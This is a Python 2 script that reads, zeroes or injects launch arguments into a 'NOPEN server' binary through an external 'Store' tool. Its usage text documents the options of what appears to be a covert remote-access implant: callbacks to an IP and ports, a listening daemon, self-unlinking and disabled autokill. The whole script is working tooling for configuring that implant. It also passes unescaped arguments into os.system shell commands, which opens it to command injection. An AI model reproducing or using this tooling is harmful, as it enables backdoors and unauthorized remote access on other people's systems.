#!/usr/bin/env python
version = '2.0.0.1'

import sys
import os
import os.path
import shutil

VAR_NAME = 'D'

def usage():

    print ''
    print 'usage: %s infile [outfile] [NOPEN-args]' % os.path.basename(sys.argv[0])
    print ''
    print 'outfile defaults to infile.new. If provided, outfile must not start'
    print 'with a "-" or contain whitespace.'
    print ''
    print 'If "ZERO" is given as the NOPEN-args argument, the argument buffer'
    print 'in infile is zeroed out.'
    print ''
    print 'If no NOPEN-args argument is given, the argument buffer in infile is'
    print 'found and shown.'
    print ''
    print 'The NOPEN-args provided are injected into infile if it is a valid'
    print 'NOPEN server (i.e., has the right head/tail tags in it). Valid NOPEN'
    print 'arguments include the same that can be provided to NOPEN server via the'
    print '$D environment variable, namely:'
    print ''
    print ' -I                stdin mode'
    print ' -i                do not autokill after 5 hours'
    print ' -u                unlink binary if possible'
    print ' -S##              sleep ## seconds before connecting'
    print ' -CIP:P1|P2|P3     callback to IP, trying multiple ports in succession'
    print ' -T##              tcp timeout if cannot connect via callback [30s]'
    print ' -r##              number of retries'
    print ' -P##              pause between connect attempts'
    print ' -cIP:PORT         callback to IP:PORT'
    print ' -lPORT            start daemon listening on PORT'
    print ' -LIP              specify the IP or listen on (default 0.0.0.0)'
    print ''
    print 'Every argument requires its own "-", preceeded by a single space (so'
    print '"-iIS15" is NOT legal). Avoid whitespace within argument values as'
    print 'shown above--i.e. use "-l32323" rather than "-l 32323".'
    print ''
    print 'NOTE: "Store" binary must be present in $PATH\n'
    print '%s version %s' % (os.path.basename(sys.argv[0]), version)

    sys.exit(1)


def main():

    infile = None
    outfile = None
    nopenargs = None
    argsidx = 0
    dostore = 0

    if len(sys.argv) < 2:
        usage()

    infile = sys.argv[1]

    if len(sys.argv) > 2:
        dostore = 1
        if sys.argv[2][0] != '-':
            outfile = sys.argv[2]
            argsidx = 3
        else:
            outfile = '%s.new' % infile
            argsidx = 2

    if not os.path.exists(infile):
        print 'ERROR: "%s" does not exist' % infile
        sys.exit(1)

    if len(sys.argv) > 2 and argsidx <= len(sys.argv):
        nopenargs = ' '.join(sys.argv[argsidx:])
        dostore = 1

    if dostore:
        print 'ASCII arguments in in between double colons:'
        print '::%s::\n' % nopenargs
        shutil.copy(infile, outfile)
        storestr = 'echo -n "%s" | Store --nullterminate --file="%s" --set="%s"' % (nopenargs, outfile, VAR_NAME)
        print 'executing Store:\n%s\n' % storestr
        os.system(storestr)
    else:
        os.system('Store --file="%s" --get="%s"' % (infile, VAR_NAME))

    files = infile
    if outfile != None:
        files = '%s %s' % (files, outfile)

    print '\nlisting:'
    os.system('ls -l %s' % files)

    print '\nsha1sums:'
    os.system('sha1sum %s' % files)
    print ''


if __name__ == '__main__':
    main()
